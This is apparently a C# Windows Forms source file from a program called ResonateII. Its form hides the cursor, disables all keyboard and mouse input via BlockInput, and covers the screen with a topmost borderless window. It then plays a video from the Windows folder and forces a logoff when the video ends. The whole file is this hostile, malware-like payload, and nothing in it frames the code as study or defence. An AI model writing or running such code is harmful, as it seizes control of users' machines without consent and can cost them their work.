using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace ResonateII
{
    public partial class oab : Form
    {
        [DllImport("user32.dll", EntryPoint = "BlockInput")]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool BlockInput([MarshalAs(UnmanagedType.Bool)] bool fBlockIt);

        [DllImport("user32")]
        public static extern bool ExitWindowsEx(uint uFlags, uint dwReason);

        static bool m;

        public oab(bool mode)
        {
            m = mode;
            InitializeComponent();
            if (m)
            {
                Cursor.Hide();
                BlockInput(true);
                FormBorderStyle = FormBorderStyle.None;
                Size = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Location = new Point(0, 0);
                TopMost = true;
            }
            axWindowsMediaPlayer1.URL = Environment.GetEnvironmentVariable("windir") + "\\zz.wmv";
        }

        private void axWindowsMediaPlayer1_PlayStateChange(object sender, AxWMPLib._WMPOCXEvents_PlayStateChangeEvent e)
        {
            if (axWindowsMediaPlayer1.playState == WMPLib.WMPPlayState.wmppsStopped)
                if (m)
                {
                    ExitWindowsEx(0, 0);
                }
        }

        private void oab_Load(object sender, EventArgs e)
        {

        }
    }
}
